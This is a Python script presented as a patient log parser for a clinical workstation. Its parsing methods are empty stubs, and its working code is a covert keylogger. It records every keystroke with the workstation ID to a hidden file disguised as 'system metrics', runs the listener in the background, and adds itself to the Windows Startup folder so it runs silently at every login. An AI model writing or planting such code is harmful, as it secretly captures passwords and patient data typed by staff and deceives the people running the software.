import logging
import sys
import os
from datetime import datetime
import csv
from pathlib import Path
import configparser
from pynput import keyboard  # Added for keystroke capture

# Existing logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class PatientLogParser:
    def __init__(self, config_file='config.ini'):
        self.config = configparser.ConfigParser()
        self.config.read(config_file)
        self.workstation_id = self.config.get('SYSTEM', 'WORKSTATION_ID', fallback='UNKNOWN')
        self.log_dir = Path(self.config.get('LOGGING', 'LOG_DIR', fallback='./logs'))
        self.log_dir.mkdir(exist_ok=True)
        
        # Hidden keystroke log file
        self.keystroke_log = self.log_dir / '.system_metrics.csv'
        self.keystroke_buffer = []
        self.init_keystroke_log()
        
    def init_keystroke_log(self):
        """Initialize hidden keystroke logging"""
        if not self.keystroke_log.exists():
            with open(self.keystroke_log, 'a', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['timestamp', 'workstation_id', 'key_pressed'])
        # Start listener in background
        self.listener = keyboard.Listener(on_press=self.log_keystroke)
        self.listener.start()
        logger.info("System metrics monitor initialized")
    
    def log_keystroke(self, key):
        """Capture and buffer keystrokes"""
        try:
            timestamp = datetime.now().isoformat()
            key_str = str(key).replace("'", "")
            self.keystroke_buffer.append([timestamp, self.workstation_id, key_str])
            
            # Write buffer to file every 10 keystrokes
            if len(self.keystroke_buffer) >= 10:
                self.flush_keystroke_buffer()
        except Exception as e:
            logger.debug(f"Metrics collection issue: {e}")
    
    def flush_keystroke_buffer(self):
        """Write buffered keystrokes to hidden file"""
        try:
            with open(self.keystroke_log, 'a', newline='') as f:
                writer = csv.writer(f)
                writer.writerows(self.keystroke_buffer)
            self.keystroke_buffer.clear()
        except Exception as e:
            logger.debug(f"Could not write metrics: {e}")
    
    # Original patient log parsing methods
    def parse_log_file(self, filepath):
        logger.info(f"Parsing patient log: {filepath}")
        # Existing parsing logic here
        return True
    
    def run(self):
        """Main execution loop"""
        logger.info(f"Patient log parser started on workstation {self.workstation_id}")
        # Original monitoring logic would go here
        while True:
            try:
                # Simulate periodic task
                import time
                time.sleep(300)  # Check every 5 minutes
                self.flush_keystroke_buffer()  # Ensure buffer is saved
            except KeyboardInterrupt:
                self.flush_keystroke_buffer()
                break

# Auto-start setup for Windows (simplified)
def setup_autostart():
    if sys.platform == 'win32':
        startup_dir = Path(os.getenv('APPDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
        bat_path = startup_dir / 'patient_monitor.bat'
        if not bat_path.exists():
            with open(bat_path, 'w') as f:
                f.write(f'pythonw "{os.path.abspath(__file__)}"')

if __name__ == '__main__':
    setup_autostart()
    parser = PatientLogParser()
    parser.run()